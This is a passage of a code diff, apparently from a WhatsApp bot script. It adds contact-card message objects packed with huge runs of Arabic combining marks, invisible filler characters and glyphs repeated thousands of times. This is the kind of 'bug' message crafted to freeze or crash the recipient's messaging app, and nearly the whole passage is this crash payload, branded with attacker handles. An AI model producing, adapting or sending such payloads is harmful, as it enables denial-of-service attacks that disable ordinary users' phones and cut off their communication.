ۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ꦾ.repeat(1000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
+      },
+      {
+        displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + "ꦾ".repeat(10000),
+        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+60 17-777 0777\nFN:+60 17-777 0777\nitem1.TEL;waid=60177770777:60177770777\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 𝙹𝙸𝙽𝚂\nitem2.EMAIL;type=INTERNET:🪭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳🪭⪼\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ꦾ.repeat(80000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
+      },
+      {
+        displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊" + "ါ".repeat(1000),
+        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+60 17-777 0777\nFN:+60 17-777 0777\nitem1.TEL;waid=60177770777:60177770777\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 𝙹𝙸𝙽𝚂\nitem2.EMAIL;type=INTERNET:🪭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳🪭⪼𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𝚂𝙴𝙲𝚁𝙴𝚃 𝙲𝙾𝙼𝙿𝙰𝙽𝚈 𝙻𝚃𝙳.𝙲𝙾𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟